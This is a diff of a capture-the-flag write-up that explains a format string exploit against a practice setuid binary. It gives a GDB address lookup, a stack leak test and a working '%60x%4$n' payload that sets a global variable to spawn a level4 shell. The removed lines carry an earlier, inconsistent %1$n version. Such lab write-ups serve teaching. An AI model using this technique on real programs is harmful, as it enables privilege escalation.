@@ -1,44 +1,152 @@
-# Level3 - Exam Notes
+# Level 3 — Format String + %n
 
-## 1. Objective
-Get a level4 shell. The binary is setuid level4; the global variable `m` must equal 64 for `system("/bin/sh")` to be called. `m` is never initialized to 64 in the code.
+## Objective
 
-## 2. Initial diagnosis (before GDB)
-- **Suspicious functions:** `fgets` then **printf(buffer)** in `v()` — the input is used as a format string (format string vulnerability).
-- **User input:** 512-byte buffer read by fgets, passed as-is to printf.
-- **Success:** `m == 64` (0x40) at address 0x804988c → system("/bin/sh") branch.
-- **Hypothesis:** format string; use %n to write 64 to the address of m. The 1st argument to printf is the buffer → %1$n writes to the address stored at the start of the buffer.
+The binary is setuid level4. The global variable `m` must equal `0x40` (64) for `system("/bin/sh")` to be called. `m` is never set to 64 in the normal code flow.
 
-## 3. GDB diagnosis (how the vulnerability was found)
-- **Where to break:** in `v`, after the call to printf(buffer). Goal: verify that m (0x804988c) has been modified.
-- **Layout:** no stack overflow; we care about the global variable. `x/wx 0x804988c` before exploit → initial value (usually 0). After payload with address 0x804988c + "%60x%1$n" → `x/wx 0x804988c` should be 0x40 (64). This proves %1$n correctly writes to the address placed at the start of the buffer.
-- **Buffer index:** the 1st argument to printf is our string (the buffer). So argument 1 points to the start of the buffer; if the first 4 bytes of the buffer are 0x804988c, then %1$n writes to that address. No need to dump %1$p…%k$p for this level.
-- **Value 64:** %n writes the number of bytes already printed. We print 4 (the address) + 60 (with "%60x") = 64, then %1$n → 64 written to 0x804988c.
-- **Flow control:** after printf, the code reads m; if m == 64, it calls system("/bin/sh"). Verify with single-step or by relaunching with the payload.
+---
 
-## 4. Building the exploit command
-- **Target:** write the value 64 to address 0x804988c (variable m).
-- **Payload structure:** [4 bytes = 0x804988c in LE] + "%60x" + "%1$n". The 4 bytes are the address where %1$n will write; "%60x" prints 60 characters (total 4+60=64); %1$n writes 64 to 0x804988c.
-- **Encoding:** address in little endian: `\x8c\x98\x04\x08`. Python: `print "\x8c\x98\x04\x08" + "%60x%1$n"`.
-- **Invocation:** stdin; keep the shell: `( python -c '...'; cat ) | ./level3`.
-- **Reference commands.md:** command in `commands.md`, section Exploitation. Demo: `( python -c 'print "\x8c\x98\x04\x08" + "%60x%1$n"'; cat ) | ./level3`.
+## 1. Understanding the Vulnerability
 
-## 5. Exploitation logic
-Format string: the input is the format of printf. By putting the address of m at the start of the buffer, %1$n writes the number of printed bytes (64) to that address. The check m == 64 passes → system("/bin/sh").
+The function `v()` reads user input safely with `fgets`, but then passes it directly to `printf`:
 
-## 6. Reproducible procedure (for evaluation)
-- **Command:** `( python -c 'print "\x8c\x98\x04\x08" + "%60x%1$n"'; cat ) | ./level3` then `cat /home/user/level4/.pass`.
-- **Expected result:** "Wait what?!" then a level4 shell.
-- **What to say:** "printf(buffer) gives a format string. I put the address of m at the start of the buffer and use %60x%1$n to write 64 to that address."
+```c
+int m = 0;  // global variable at 0x804988c
 
-## 7. Oral defense points
-- **Bug:** printf(buffer) with a user-controlled buffer (v(), after fgets).
-- **GDB:** confirms m is at 0x804988c and that after the payload it equals 64; %1$n writes to the 1st argument = start of the buffer.
-- **Payload:** 4 bytes (address of m) + "%60x%1$n".
-- **Fix:** printf("%s", buffer) or never use input as a format string.
+void v(void) {
+    char buf[520];
+    fgets(buf, 512, stdin);   // safe: bounded read
+    printf(buf);              // VULNERABLE: buf is used as the format string
+    if (m == 0x40) {
+        system("/bin/sh");    // win condition
+    }
+}
+```
 
-## 8. Common evaluator questions
-- **What does %n do?** It writes the number of bytes already printed to the address provided by the corresponding argument.
-- **Why %1$n?** The 1st argument to printf is our buffer; by putting an address at the start, %1$n writes to that address.
-- **Why 60?** 4 (address) + 60 = 64, the required value for m.
-- **Where is m?** Global variable in .bss at 0x804988c.
+Because `printf(buf)` uses our input as the format string itself, we can inject format specifiers like `%x` and `%n`.
+
+### What does `%n` do?
+
+`%n` writes the **number of characters printed so far** into the memory address pointed to by the corresponding argument.
+
+```c
+int x;
+printf("AAAA%n", &x);
+// x is now 4
+```
+
+This means: if we can control how many characters are printed, and supply the address of `m`, we can write any value we want into `m`.
+
+---
+
+## 2. Finding the Address of `m`
+
+In GDB:
+
+```bash
+(gdb) p &m
+$1 = 0x804988c
+```
+
+Target address: **`0x804988c`**
+
+---
+
+## 3. Finding the Stack Position of Our Buffer
+
+We send a recognizable pattern to locate where our input sits on the stack:
+
+```bash
+echo "AAAA %x %x %x %x %x %x" | ./level3
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+```
+
+- `AAAA` at the start → printf printing the literal characters from the format string
+- `41414141` in the middle → printf reading the stack with `%x` and finding our buffer (A = 0x41 in ASCII)
+
+Counting the positions:
+
+```
+Position 1: 200
+Position 2: b7fd1ac0
+Position 3: b7ff37d0
+Position 4: 41414141  ← our buffer starts HERE
+```
+
+Our buffer is at **stack position 4**. This means we must use `%4$n`.
+
+---
+
+## 4. Building the Payload
+
+We need exactly **64 characters** printed before `%n` hits.
+
+```
+[address of m — 4 bytes] + [%60x] + [%4$n]
+     4 chars printed         60 chars      write 64 to m
+```
+
+- `\x8c\x98\x04\x08` → address `0x804988c` in little-endian (x86 stores least significant byte first)
+- `%60x` → prints 60 characters (pads a hex value with spaces)
+- `%4$n` → writes the total character count (64) into the address at stack position 4
+
+Total characters printed: 4 + 60 = **64 = 0x40** ✓
+
+---
+
+
+## 5. Executing the Exploit
+
+```bash
+(python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"'; cat) | ./level3
+```
+
+### What happens step by step:
+
+1. Python sends the payload into stdin
+2. `cat` keeps stdin open so the spawned shell doesn't die immediately
+3. `fgets` reads the payload into `buf`
+4. `printf(buf)` executes:
+   - Prints the 4 address bytes → **4 chars printed**
+   - `%60x` prints a padded hex value → **64 chars total**
+   - `%4$n` writes 64 into memory at `0x804988c` (which is `m`)
+5. The check `if (m == 0x40)` is now **true**
+6. `system("/bin/sh")` executes
+
+```bash
+$ whoami
+level4
+$ cat /home/user/level4/.pass
+```
+
+---
+
+## 6. Summary
+
+```
+Stack when printf runs:
+
+Position 1: 200
+Position 2: b7fd1ac0
+Position 3: b7ff37d0
+Position 4: 0x804988c  ← address of m (we put it here)
+...
+
+printf sees:
+  \x8c\x98\x04\x08 → prints 4 chars
+  %60x             → prints 60 chars  (total = 64)
+  %4$n             → writes 64 into address at position 4
+                                             ↓
+                                      m = 64 = 0x40 ✓
+```
+
+| Step | Action |
+|------|--------|
+| 1 | Find address of `m` with GDB: `0x804988c` |
+| 2 | Find stack position of buffer with AAAA leak test: position **4** |
+| 3 | Build payload: address + `%60x` + `%4$n` |
+| 4 | Print exactly 64 chars so `%n` writes 64 into `m` |
+| 5 | Win condition `m == 0x40` is true → shell spawns |
+
+---
+
